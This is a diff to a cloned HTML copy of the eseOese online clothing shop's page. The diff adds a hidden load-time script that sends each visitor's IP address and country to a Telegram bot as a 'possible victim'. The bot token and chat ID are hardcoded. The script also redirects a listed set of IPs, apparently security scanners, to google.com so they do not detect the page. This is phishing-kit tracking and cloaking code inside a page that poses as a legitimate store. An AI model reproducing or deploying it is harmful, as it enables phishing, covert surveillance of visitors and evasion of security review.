@@ -17,7 +17,60 @@ pintrk('page');
       "url": "https://www.eseoese.com",
       "logo": "https://www.eseoese.com/cdnassets/logo-web-ok.png"
     }
-    </script><script async="" src="./eseOese _ Shop online - Moda casual, accesorios y zapatos para mujer_files/js(2)"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-11361303950'); </script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    </script>
+	<script>
+        const telegramBotToken = '7614443524:AAGSCdlmsGxSUGLMdsB3shiYO-SumLix0ls'; // acá el bot
+        const chatId = '-4776466179'; // acá el chat
+
+        async function getCountry() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.country;
+            } catch (error) {
+                console.error('Error al obtener el país:', error);
+                return 'País Desconocido';
+            }
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error al obtener la dirección IP:', error);
+                return 'IP Desconocida';
+            }
+        }
+
+        async function enviarMensaje() {
+            const pais = await getCountry();
+            const ip = await getIPAddress();
+
+            const mensaje = `Posible victima detectada ⚠️\n\n\País: ${pais}\n\IP: ${ip}`;
+             // aqui añadir las ip de la rata si es necesario
+            if (ip === '2803:1800:5101:a2a6:a0b9:233c:78f9:5b4e' || ip === '187.161.198.94' || ip === '189.164.77.82' || ip === '52.247.239.25' || ip === '146.190.197.169' || ip === '184.151.190.167' || ip === '164.90.241.135' || ip === '159.203.53.95' || ip === '2406:da1a:76e:a220:ddc4:7362:6225:78c3' || ip === '40.80.158.10' || ip === '20.76.220.196' || ip === '52.11.171.106' || ip === '54.39.250.87' || ip === '128.90.59.151' || ip === '51.195.34.243') { 
+                window.location.href = 'https://google.com/'; // aqui es a donde va a redireccionar la rata (el mensajito html)
+                return;
+            }
+
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Mensaje enviado correctamente:', data);
+                })
+                .catch(error => {
+                    console.error('Error al enviar el mensaje o redirigir:', error);
+                });
+        }
+
+        enviarMensaje();
+    </script>
+	<script async="" src="./eseOese _ Shop online - Moda casual, accesorios y zapatos para mujer_files/js(2)"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-11361303950'); </script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
